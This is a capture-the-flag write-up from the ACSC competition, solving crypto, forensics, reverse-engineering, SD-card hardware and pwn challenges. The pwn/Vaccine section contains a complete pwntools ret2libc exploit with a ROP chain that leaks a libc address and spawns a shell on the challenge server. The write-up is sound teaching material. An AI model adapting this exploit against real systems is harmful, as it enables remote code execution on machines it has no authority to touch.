<details>
<summary>whoami</summary>

```
Full name: Byambadalai Sumiya (ByamB4)
Country: Mongolia
Place: #53
Discord: ByamB4#3148
```
</details>

## `crypto/Merkle Hellman`
I don’t know much about `merkle hellman` cryptosystem but when you look at source code (didn’t included very long) flag encrypted with character by character and there is not much advanced thing just binary operation. So we can just brute force it.

```python
n = [7352, 2356, 7579, 19235, 1944, 14029, 1084]
d = ([184, 332, 713, 1255, 2688, 5243, 10448], 20910)
c = [8436, 22465, 30044, 22465, 51635, 10380, 11879, 50551, 35250, 51223, 14931, 25048, 7352, 50551, 37606, 39550]

# flag[0] = 7352 + 1084 -> ACSC{E4
# flag[1] = 

for j in range(len(c)):
    for _ in range(0, 255):
        s = 0
        for i in range(7):
            if _ & (64 >> i):
                s += n[i]
        if s == c[j]:
            print(chr(_), end='')
            break
# this is solve script during competition ACSC{E4zY_P3@zy}
```

## `forensics/pcap - 1`
So we are given very big **.pcap** which contains a lot of USB keyboard traffic so after digging some packet contains **Keyboard d and D** data. So I tried writing a Scapy script, but it didn't work. After exporting, it looks like this.

```
HID Data: 0000070800000000
    .... ...0 = Key: LeftControl (0xe0): UP
    .... ..0. = Key: LeftShift (0xe1): UP
    .... .0.. = Key: LeftAlt (0xe2): UP
    .... 0... = Key: LeftGUI (0xe3): UP
    ...0 .... = Key: RightControl (0xe4): UP
    ..0. .... = Key: RightShift (0xe5): UP
    .0.. .... = Key: RightAlt (0xe6): UP
    0... .... = Key: RightGUI (0xe7): UP
    Padding: 00
    Array: 070800000000
        0000 0111 = Usage: Keyboard d and D (0x0007, 0x0007)
        0000 1000 = Usage: Keyboard e and E (0x0007, 0x0008)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000) 
```
After some grepping we have this data which contains bunch of keyboard stroke.
```
sslliidddedeeeesessss.s...gggogooooogglleee.e...ccooomommmReturn (ENTER) (0x0007, 0x0028)Return (ENTER) (0x0007, 0x0028)ccttffSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)iinntttrtrtrotrororoooSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)pprrrereeessseseeeenennnttaaatatttiiioiooonnhhoowwSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)ttooSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)bbeeSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)ggooooddSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)aaatatttSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)ccttffss//aaSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)bbeeggiinnnneeererrr''ssSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)gSpacebar (0x0007, 0x002c)ggguuuiuiiidddedeeeaaDELETE (Backspace) (0x0007, 0x002a)DELETE (Backspace) (0x0007, 0x002a)ddoonnoottcchheeaaatatttgggguuueueeessssiiininnnngngggiissggooooddtttthhiiisisssSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)iiisisssSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)aaanannnnSpacebar (0x0007, 0x002c)nSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)eSpacebar (0x0007, 0x002c)eeexxxaxaaaamammmppplplplepleleleeeeSpacebar (0x0007, 0x002c)eSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)ooofoffffSpacebar (0x0007, 0x002c)fSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)aaaSpacebar (0x0007, 0x002c)aSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)fflllalaaaagaggg;;aaccsscc[[ff00rr33nnss11ccss--iiss--ss00--ffuummDELETE (Backspace) (0x0007, 0x002a)DELETE (Backspace) (0x0007, 0x002a)nn]]iiffSpacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)Spacebar (0x0007, 0x002c)ySpacebar (0x0007, 0x002c)...
```
Then we can get flag by hand `ACSC{f0r3ns1cs_is_s0_fun}`

```
you_can_read_this_message_congrats
but_the_flag_you_see_now_the_accepted
flag_inspect_the_packets_more_deeply_**_and_you_will_reveal_more_information_about_what_is_happening_writing_this_****_people
the_flag_is_working_or_the_challenge_is_broken_btw_i_don't_like_forensics_too 
```

## `rev/serverless`

It was most interesting challenge. I thought easy js one but in the it was pretty hard. So we are given obfuscated js code and encrypted flag text with **acscpass** pasword. 
At first i tried [jsnice](http://jsnice.org/) but it gives some error, but it’s very understandable and can be prettify by hand.

```js
var a = document['querySelector']('form');
a['addEventListener']('submit', function (c) {
    c['preventDefault']();
    var d = document['querySelector']('textarea[name=\'message\']')['value'],
        e = document['querySelector']('input[name=\'password\']')['value'],
        f = document['querySelector']('input[name=\'encrypt\']'),
        g = b(d, e),
        h = document['querySelector']('p.response');
    h && h['remove']();
    var i = document['createElement']('p');
    i['classList']['add']('response'), i['textContent'] = 'Encrypted message: ' + g, f['insertAdjacentElement']('afterend', i);
});

function b(d, f) {
    var g = [0x9940435684b6dcfe5beebb6e03dc894e26d6ff83faa9ef1600f60a0a403880ee166f738dd52e3073d9091ddabeaaff27c899a5398f63c39858b57e734c4768b7n, 0xbd0d6bef9b5642416ffa04e642a73add5a9744388c5fbb8645233b916f7f7b89ecc92953c62bada039af19caf20ecfded79f62d99d86183f00765161fcd71577n, 0xa9fe0fe0b400cd8b58161efeeff5c93d8342f9844c8d53507c9f89533a4b95ae5f587d79085057224ca7863ea8e509e2628e0b56d75622e6eace59d3572305b9n, 0x8b7f4e4d82b59122c8b511e0113ce2103b5d40c549213e1ec2edba3984f4ece0346ab1f3f3c0b25d02c1b21d06e590f0186635263407e0b2fa16c0d0234e35a3n, 0xf840f1ee2734110a23e9f9e1a05b78eb711c2d782768cef68e729295587c4aa4af6060285d0a2c1c824d2c901e5e8a1b1123927fb537f61290580632ffea0fbbn, 0xdd068fd4984969a322c1c8adb4c8cc580adf6f5b180b2aaa6ec8e853a6428a219d7bffec3c3ec18c8444e869aa17ea9e65ed29e51ace4002cdba343367bf16fdn, 0x96e2cefe4c1441bec265963da4d10ceb46b7d814d5bc15cc44f17886a09390999b8635c8ffc7a943865ac67f9043f21ca8d5e4b4362c34e150a40af49b8a1699n, 0x81834f81b3b32860a6e7e741116a9c446ebe4ba9ba882029b7922754406b8a9e3425cad64bda48ae352cdc71a7d9b4b432f96f51a87305aebdf667bc8988d229n, 0xd8200af7c41ff37238f210dc8e3463bc7bcfb774be93c4cff0e127040f63a1bce5375de96b379c752106d3f67ec8dceca3ed7b69239cf7589db9220344718d5fn, 0xb704667b9d1212ae77d2eb8e3bd3d5a4cd19aa36fc39768be4fe0656c78444970f5fc14dc39a543d79dfe9063b30275033fc738116e213d4b6737707bb2fd287n],
        h = [0xd4aa1036d7d302d487e969c95d411142d8c6702e0c4b05e2fbbe274471bf02f8f375069d5d65ab9813f5208d9d7c11c11d55b19da1132c93eaaaba9ed7b3f9b1n, 0xc9e55bae9f5f48006c6c01b5963199899e1cdf364759d9ca5124f940437df36e8492b3c98c680b18cac2a847eddcb137699ffd12a2323c9bc74db2c720259a35n, 0xcbcdd32652a36142a02051c73c6d64661fbdf4cbae97c77a9ce1a41f74b45271d3200678756e134fe46532f978b8b1d53d104860b3e81bdcb175721ab222c611n, 0xf79dd7feae09ae73f55ea8aa40c49a7bc022c754db41f56466698881f265507144089af47d02665d31bba99b89e2f70dbafeba5e42bdac6ef7c2f22efa680a67n, 0xab50277036175bdd4e2c7e3b7091f482a0cce703dbffb215ae91c41742db6ed0d87fd706b622f138741c8b56be2e8bccf32b7989ca1383b3d838a49e1c28a087n, 0xb5e8c7706f6910dc4b588f8e3f3323503902c1344839f8fcc8d81bfa8e05fec2289af82d1dd19afe8c30e74837ad58658016190e070b845de4449ffb9a48b1a7n, 0xc351c7115ceffe554c456dcc9156bc74698c6e05d77051a6f2f04ebc5e54e4641fe949ea7ae5d5d437323b6a4be7d9832a94ad747e48ee1ebac9a70fe7cfec95n, 0x815f17d7cddb7618368d1e1cd999a6cb925c635771218d2a93a87a690a56f4e7b82324cac7651d3fbbf35746a1c787fa28ee8aa9f04b0ec326c1530e6dfe7569n, 0xe226576ef6e582e46969e29b5d9a9d11434c4fcfeccd181e7c5c1fd2dd9f3ff19641b9c5654c0f2d944a53d3dcfef032230c4adb788b8188314bf2ccf5126f49n, 0x84819ec46812a347894ff6ade71ae351e92e0bd0edfe1c87bda39e7d3f13fe54c51f94d0928a01335dd5b8689cb52b638f55ced38693f0964e78b212178ab397n],
        j = Math['floor'](Math['random']() * (0x313 * -0x8 + 0x24c1 + -0xc1f)),
        k = Math['floor'](Math['random']() * (-0x725 + -0x1546 + 0x1c75)),
        l = g[j],
        o = h[k],
        r = l * o,
        s = Math['floor'](Math['random']() * (0x2647 + 0x1 * 0x2f5 + -0x2937)),
        t = Math['pow'](-0x14e6 + 0x43 * 0x55 + -0x7 * 0x31, Math['pow'](-0x14e1 * 0x1 + -0x2697 + 0x2e * 0x14b, s)) + (-0x235d + 0x2 * 0x82b + 0x3a * 0x54);

    function u(A) {
        var B = new TextEncoder()['encode'](A);
        let C = 0x0n;
        for (let D = 0x13c8 + 0x1 * 0x175b + -0x2b23; D < B['length']; D++) {
            C = (C << 0x8n) + BigInt(B[D]);
        }
        return C;
    }
    var v = u(d);

    function w(A, B, C) {
        if (B === -0x9d + 0x993 + 0x1f * -0x4a) return 0x1n;
        return B % (0x1 * 0x2dc + 0x28 * -0x12 + -0xa) === -0x2446 * -0x1 + 0x3 * 0xcd5 + -0x4ac5 * 0x1 ? w(A * A % C, B / (-0x6a3 * 0x5 + 0xcba + 0x1477 * 0x1), C) : A * w(A, B - (-0x1cd0 + 0x11fc + 0xad5), C) % C;
    }
    var x = w(v, t, r);
    let y = [];
    while (x > 0x1 * 0x371 + 0x1519 + -0x188a) {
        y['push'](Number(x & 0xffn)), x = x >> 0x8n;
    }
    y['push'](Number(s)), y['push'](Number(k)), y['push'](Number(j));
    var z = new TextEncoder()['encode'](f);
    for (let A = -0xa00 + 0x1 * 0x20e0 + -0x4 * 0x5b8; A < y['length']; ++A) {
        y[A] = y[A] ^ z[A % z['length']];
    }
    return btoa(y['reverse']());
}
```

After cleaning we can see logic **btoa** (base64) then reverse string. Then xor with given password. After that we get list of numbers.
```python
from base64 import b64decode as b6dc

c = 'MTE3LDk2LDk4LDEwNyw3LDQzLDIyMCwyMzMsMTI2LDEzMSwyMDEsMTUsMjQ0LDEwNSwyNTIsMTI1LDEwLDE2NiwyMTksMjMwLDI1MCw4MiwyMTEsMTAxLDE5NSwzOSwyNDAsMTU4LDE3NCw1OSwxMDMsMTUzLDEyMiwzNiw2NywxNzksMjI0LDEwOCw5LDg4LDE5MSw5MSwxNCwyMjQsMTkzLDUyLDE4MywyMTUsMTEsMjYsMzAsMTgzLDEzMywxNjEsMTY5LDkxLDQ4LDIyOSw5OSwxOTksMTY1LDEwMCwyMTgsMCwxNjUsNDEsNTUsMTE4LDIyNywyMzYsODAsMTE2LDEyMCwxMjUsMTAsMTIzLDEyNSwxMzEsMTA2LDEyOCwxNTQsMTMzLDU1LDUsNjMsMjM2LDY5LDI3LDIwMSwxMTgsMTgwLDc0LDIxMywxMzEsNDcsMjAwLDExNiw1Miw0OSwxMjAsODYsMTI0LDE3OCw5MiwyNDYsMTE5LDk4LDk1LDg2LDEwNCw2NCwzMCw1NCwyMCwxMDksMTMzLDE1NSwxMjIsMTEsODcsMTYsMjIzLDE2MiwxNjAsMjE1LDIwOSwxMzYsMjQ5LDIyMSwxMzYsMjMy'
c = list(map(int, b6dc(c).decode().split(',')))[::-1]
k = 'acscpass'

for _ in range(len(c)): print(c[_] ^ ord(k[_ % len(k)]), end=' ')
```

```
[137, 235, 174, 154, 248, 176, 164, 211, 195, 188, 99, 52, 123, 27, 232, 246, 12, 119, 69, 125, 48, 9, 37, 44, 3, 20, 133, 63, 194, 29, 37, 11, 80, 87, 7, 171, 95, 226, 166, 57, 213, 21, 186, 120, 53, 141, 76, 118, 86, 230, 233, 227, 26, 226, 14, 8, 107, 30, 11, 23, 32, 141, 144, 5, 86, 74, 214, 99, 170, 5, 214, 180, 2, 134, 67, 56, 217, 192, 246, 196, 127, 121, 120, 180, 199, 85, 178, 147, 111, 56, 204, 59, 121, 13, 147, 192, 34, 71, 9, 250, 23, 90, 221, 237, 145, 68, 176, 6, 163, 51, 137, 149, 186, 197, 121, 30, 140, 8, 135, 124, 168, 224, 13, 138, 172, 74, 116, 24, 3, 3,6] 
```

Last part of `[3, 3, 6]` is `y['push'](Number(s)), y['push'](Number(k)), y['push'](Number(j));` so now we know s=3 k=3 y=6 which means we can get `t` `r` value.

```
t = 257
r = 102485920709293920960707756584705775468454691825076664322258584664868769934448324119355259368527744283871914200533016696094198363871954854914764112265927879076270224497604163862376216622747032044206770015232334951699373496904252792421180061721266555715826538102269191846795895407595749835308753191557026877839
```

Before we go `w(v, t, r);` this function we need to figure out the `x` value that is used to generate the list of numbers.

```js
while (x > 0x1 * 0x371 + 0x1519 + -0x188a) {
  y['push'](Number(x & 0xffn)), x = x >> 0x8n;
}
```

`x & 0xff` is getting the least significant 8 bits of the `x` value, and then it shifts right. We can reverse this progress. My code looks so messy.

```python
enc_y = [137, 235, 174, 154, 248, 176, 164, 211, 195, 188, 99, 52, 123, 27, 232, 246, 12, 119, 69, 125, 48, 9, 37, 44, 3, 20, 133, 63, 194, 29, 37, 11, 80, 87, 7, 171, 95, 226, 166, 57, 213, 21, 186, 120, 53, 141, 76, 118, 86, 230, 233, 227, 26, 226, 14, 8, 107, 30, 11, 23, 32, 141, 144, 5,
         86, 74, 214, 99, 170, 5, 214, 180, 2, 134, 67, 56, 217, 192, 246, 196, 127, 121, 120, 180, 199, 85, 178, 147, 111, 56, 204, 59, 121, 13, 147, 192, 34, 71, 9, 250, 23, 90, 221, 237, 145, 68, 176, 6, 163, 51, 137, 149, 186, 197, 121, 30, 140, 8, 135, 124, 168, 224, 13, 138, 172, 74, 116, 24]

# 410274476, 1602634, 6260, 24
valid = [24]

def n_shift(s, n):
    for _ in range(n):
        s = s >> 8
    return s

# it will give error then it stop
while True:
    glob_n = (valid[0] << 8) + 100_000
    for _ in range(glob_n, glob_n - 200_000, -1):
        can = _ & 0xff == enc_y[-(len(valid) + 1)]
        if can:
            for i in range(len(valid)):
                if n_shift(_, i + 1) != valid[i]:
                    can = False
                    break
        if can:
            print('valid: ', _)
            valid.insert(0, _)
            # input()
            break
```

After running this code we can get `x` value

```
x = 17172368473463775987747325243524856596273056872571298967444142775606729659218809227594603445966794185371450507695322308374038345885732451619228797886053516375083650311753091110338343431079576203599449606477915662537089095568830140907282898414145413832115081384076499237876637981486168293932485880888689617801
```

Last part is `w` function. This function takes our flag and then does some recursive things

```python
def w(A, B, C):
    if B == 0:
        return 0x1
    elif B % 2 == 0:
        return w((A * A) % C, B / 2, C)
    elif B % 2 == 1:
        return (A * w(A, B - 1, C)) % C
# A = our_flag decimal
# B = 257
# C = is our r value 
# and it retuns our x value
# third branch -> second branch (8) -> third branch -> first branch 
```
After some digging it’s modular exponentiation algorithm so it's similar to `pow(A, B, C)` or `(A ^ B) % C`. Last solve script.

```python
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

# factor of r value we are given before
p = 7902539523670688752549365452498382985299018894363342133531323012327857960923461934902488879455588857566708722435022350733082133933092267702307821906957977
q = 12968732443832149370169937542849870171809900018949150636308457250052280094029579199566526477098080152448048695730264594884959310262897810775613424383036007
c = 17172368473463775987747325243524856596273056872571298967444142775606729659218809227594603445966794185371450507695322308374038345885732451619228797886053516375083650311753091110338343431079576203599449606477915662537089095568830140907282898414145413832115081384076499237876637981486168293932485880888689617801
e = 0x101

# Carmichael totient
l = ((p - 1) * (q - 1)) // egcd(p - 1, q - 1)[0]
d = modinv(e, l)

m = pow(c, d, p * q)
print(m.to_bytes(100, byteorder = "big")) # ACSC{warmup_challenge_so_easy}  personally i don't think its warmup hha
```

## `pwn/Vaccine`

Very straightforward `ret2libc`, `one_gadget` challenge but have to bypass **strcmp** with **\x00** null byte and our padding only contains **ACGT** character.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('vaccine')
# can be calculated from leaked offset (__libc_start_main)
libc = ELF('libc.so.6')

host = args.HOST or 'vaccine.chal.ctf.acsc.asia'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+417
continue
'''.format(**locals())

pop_rdi = 0x0000000000401443
ret     = 0x000000000040101a

pad = (b'ACGT' * 28)[:-1]  + b'\x00' + (b'ACGT' * 28)[:-1] +  b'\x00' + cyclic(40)
io = start()
pay = pad
pay += p64(pop_rdi)
pay += p64(exe.got.__libc_start_main)
pay += p64(exe.plt.puts)
pay += p64(exe.sym._start)

io.sendlineafter(b'vaccine: ', pay)
leak = io.recv().split()
leak = leak[leak.index(b'castle') + 1]
leak = u64(leak.ljust(8, b'\x00'))
info(f'leak: {hex(leak)}')
libc.address = leak - libc.sym.__libc_start_main
info(f'libc: {hex(libc.address)}')
pay = pad
pay += p64(ret) # for stack alignment issue
pay += p64(pop_rdi)
pay += p64(next(libc.search(b'/bin/sh\x00')))
pay += p64(libc.sym.system)
# pay += p64(exe.sym._start)
io.sendline(pay)
io.interactive()
```

## `rev/ngo`

At first I thought just have to patch that **Sleep()** with another argument then it will just prints whole flag. But there's a lot more to it. It generates random number using [Linear-feedback shift register](https://en.wikipedia.org/wiki/Linear-feedback_shift_register) then it xors be careful with `v4` value it have to `uint64` or it will print wrong bytes. Final solve script

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

uint32_t seed = 0x3D2964F0;
uint64_t generate_random_number()
{
  uint32_t bit = seed & 1;
  seed >>= 1;
  seed ^= (-bit) & 0x80200003;
  return seed;
}

int main()
{
  char flag[12] = {1, 0x19, 0xef, 0x5a, 0xfa, 0xc8, 0x2e, 0x69, 0x31, 0xd7, 0x81, 0x21};
  uint64_t v4;
  uint8_t num;
  uint8_t charr;

  v4 = 1;
  printf("ACSC{");
  for (uint32_t i = 0; i <= 11; ++i)
  {
    for (uint32_t j = 0; j < v4 % (((uint64_t)1 << 32) - 1); j++)
    {
      num = generate_random_number();
    }

    charr = num ^ flag[i];
    printf("%c", charr);
    fflush(stdout);
    v4 *= 0x2A;
  }

  printf("}\n");
} // ACSC{yUhFgRvQ2Afi}
```

## `hardware/not so hard`

I didn’t know much about SD card and **SPI mode** thing. Maybe I’m the only one doing it just bare hand. So interesting part was communcation between sd card to device.

```
Device to SD Card : 510000000055
SD Card to Device : 00
SD Card to Device : fffffffffffffffffffeffd8ffe000104a46494600010101004800480000ffdb0043002c1e2127211c2c272427322f2c35426f48423d3d42886166506fa18da9a69e8d9b98b1c7ffd8b1bcf1bf989bdeffe0f1ffffffffffacd5ffffffffffffffffffffdb0043012f3232423a4282484882ffb79bb7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc20011080355028003011100021101031101ffc400190001010101010100000000000000000000000102030405ffc4001801010101010100000000000000000000000001020304ffda000c03010002100310000001f1800000140000000052800a529a346e29a29a280000000002804000000000000001c4f15000080000a53a1a2c5294a0a5294a500a0800000001400000000014100000000000000064f9d40002000029e98ee50014000000005040000002800000a40000000000000000000014f9b590002000029ee8d8050000000000504000000280000000000000000000000000014f09c68002000029f4600a000000000500004000050000000002900000000000000000283ca796801000003a9ee8000000000000a000400140000000280002000000000000000a00389e1a02000000f447ac0000000000050000400a00000000280002000000000000000a00327cda00400000f6477000000000001411dc
Device to SD Card : 51000000142f
SD Card to Device : 00
SD Card to Device : fffffffffffffe6b2198368e4d7679ae6b9e4cbc6aa6bbe9a5f1c59144b0635608228b0411471676a3a5736854a21651850f3b54e87dd4280b93c852a54a9d51b37c5e6d1a254bd1463db16ed6c09d11b75ca28960c5160c5c317bb5b3eaf0a1e434e184551534534d1510b2a8576b0cb90b894ae6d0a3a6582bf85dd587834a952a54b056d10a142851e010a142850b92e4afa254a969f00a6f43dd5bc143970e7c267cf6429f109c7952a54a9f0ca6cd0f453d02db83a25b2e54a956dea342850a146f4a953ec2ffc4002c100002010205050002010501010000000000011121311041516171203040819160a150b1c1e1f0f170d1ffda0008010100013f21f165a1bc375f0dd7c3746f8de1b02d542d656ab390804793e7f0e93c5f798d448b44de44b41fe906e0de66fb398d8fde136a4593e10b4fe55206dde4a9fe06b2ad1f7523f03921b7ee252e3f044fe877167f04925b6ee2d6f45f822c2dbb8b5bdff05581bf6d63f05229eabb69422fc153b41651bfe0d02ed24a6df83c8adfb2956fc1e247af656a7bfe08d1afc13492b0927a76523f9d135639c1c73f52be3a558d9473a066f32e70a1b705956abb290ab6fe451738c1b4aee08649bf46a539c76df70a129c8e364b52f283216869408d2ab9c287a587e8635258458a308975acaadff826b70ea37ff4324958684be0dc8f424b1e12b5266c269d9ce146c89a4b851da25ef825628a
Device to SD Card : 51000000366f
SD Card to Device : 00
SD Card to Device : fffffffffffffffffffffffffeb502c3526c5612b655de348b54e4cb30559519a9d2a3ebb39209ba7cc5604af32ce7a7ddc336432c2617266a59b96f58adae39ada3b475ade32a42158a80752e1692f694d4c255b6d7c74a989f314ad2010f0ea4b54203761718cd82a6496e5e6b5a1a84dafea24489343ccc05e2285d4554752c5abc4d5c7645256f74e53302c4c160572c3669a455fbf109b29dc252a2f68dd478d9e25ba5bf685099ac933475205828b9adaf1c54de6472218ef4e6f31516c97772839d4a2838cb7825caf7965e8a9729e060bb33c4b96b2afa1c3cca951224d418f722d8b2a63b4b39259c935d3a5bd866ea26e68d17529456ab80696299b95502aeac343297982e015c662c52a9ae59572d85d6a58197e65b79b875377753cc34b96a088d2ad3956d0349a0d9b5f78ea003bb09115cb9420ddda6491016dd2c63163ef0fab5047a3c9571348711816019d51296f4692e356c743882d9b1a31b3a93479859806d06b19aa962296013b0b12f76046d6d16769440505bbd61ff00ac8ce6324a072e9ee28309856d85600388e358a99312c96421808c4264ac911d05ed09aa78ef15b19c6116dc3dba4a72757a033d0e2c0d17a45220ee7cf101cb45a1b2fbdcb664b2fc74388fb10ac179f8822190dbfc95681c4b775f3157557cf470dda30ca39c5fc4c0bae5fb42c31abbb8e62cc816a2b686e485a7ef2d5b015533e637cea934c37390f096fa
.
.
.
Device to SD Card : 510000003eff
SD Card to Device : 00
SD Card to Device : fffffffffffffffffffffffffe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
Device to SD Card : 5100000029b3
SD Card to Device : 00
SD Card to Device : fffffffffffffffffffffffffe967bc2730f9a529597a525331c365782c5e1dccf09f2ec8420d931aec4cb62699016b47584ef13b0becb9a64669f2bc162eb84e274b706afc54c702243074898db42bb188688fd0a753e56a1b63b691d83d085de4b97a16af7a1a6266f8ba9887a43ce50b8fc44d833da84d28d4ea3d2fa5f392327a1a1f1385e037c4e3d8c5f0742a85c10272d523d38d34b1912187d6da26e3968cbe0beea7e53d161710a51646ba1fe46ad8858f818b0c5d2c7c4a51b24f05efa975317436275f894621088d05cae1a3136e21387d4fa91c314aaf0d5784f11270b24ee69df10641a13423b09d3827c38c55ea30416ca2d8e94a8f45f65768f7c264253c04b3e1be18904cc1254dbb3050a387574512a1e305c0eec7773e1427c37c41ed5162c8813a6728991ae98345599d1985269fd96d23fb1fd0a737bcf151db45b82d8bc9a54544107f63fb1fd0fe9e34c98620da2e68bbf918d1190825dbc2727076d957627fe9506d968796895a17e263d18641b7d1968af44b46087f41755e613b7af46488ca2b8422fd3060c15157e14a28a29a22a24bd981bd784d264445e15e213befe82ff000c99b070acbde62a4cc53146cfd8d0760efb1a74d3c18a257d11fe0aefd85a88f47fb3fd9af10842108421084e5a1ec7628c096448beb418dde281cd90f01796355f12f86c6427895e1bd75b29595c94bd11611f844d1a6871e8aba2ac836af01649 
```

So every data starts with **fffffffffffffffffffe** after removing the `jpg` file signature **ffd8ff...** removing first pattern and combing all data then giving it to cyberchef. Image looks so bad maybe there is more thing to do. So stucked tried to read documentation and watch videos but no luck. Trying to sort with **510000000055** header data **510000003eff** also some data **fffffffffffffffffffffffffe** offsets were 12 and 24 so collecting only the data at offsets 12 and 24 to create image.

```python
with open('data.txt', 'r') as f:
    data = f.readlines()

dic = []
for _ in range(0, len(data), 3):
    value_1 = int(data[_:_+3][0].split()[-1], 16)
    value_2 = data[_:_+3][-1].split()[-1]
    dic.append({
        'index': value_1,
        'value': value_2[value_2.index('fe') + 2:],
        'fe': value_2.index('fe')
    })

dic = sorted(dic, key=lambda x: x['index'])

# dic[2], dic[6] = dic[6], dic[2] dunno what i'm doing
# dic[3], dic[4] = dic[4], dic[3] switching places i guess
# dic[4], dic[5] = dic[5], dic[4]

for _ in dic:
    if _['fe'] == 18 or _['fe'] == 12:
        print(_['value'])

# _12, _24 = [], []

# for _ in dic:
#     # print(_['fe'])
#     if _['fe'] == 12:
#         _12.append(_)
#     elif _['fe'] == 24:
#         _24.append(_)

# print(dic[0]['value'],end='')
# for _ in range(0, len(_12)):
#     # print(_24[_]['value'], end='')
#     print(_12[_]['value'],end='')
# # print(_24[-1]['value'], end='')
```

After some time I did see some recognizable character then tried padding , removing some bytes image became kind of readable (lucky me). `ACSC{1tW@sE@syW@snt?}`

